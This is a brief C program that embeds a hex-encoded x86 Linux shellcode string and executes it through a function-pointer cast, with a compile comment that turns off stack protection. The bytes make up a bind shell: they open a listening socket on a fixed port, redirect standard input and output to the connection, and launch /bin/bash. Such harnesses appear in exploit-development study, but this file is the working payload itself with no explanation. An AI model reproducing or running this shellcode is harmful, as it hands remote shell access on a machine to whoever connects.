#include <stdio.h>
#include <string.h>
// gcc -fno-stack-protector -z execstack executor.c -o executor.elf

char shellcode [] =\
"\xb0\x66\xb3\x01\x99\x89\xd7\x57\x53\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x5b\x57\x66\x68\x3a\x97\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x57\x56\x89\xe1\xcd\x80\xb0\x66\xfe\xc3\x57\x56\x89\xe1\xcd\x80\x93\x89\xf9\xb1\x03\xb0\x3f\x49\xcd\x80\x75\xf9\xb0\x0b\x57\x68\x62\x61\x73\x68\x68\x6e\x2f\x2f\x2f\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80";



int main(int argc, char **argv[]){
	(* (int (*)())shellcode)();
}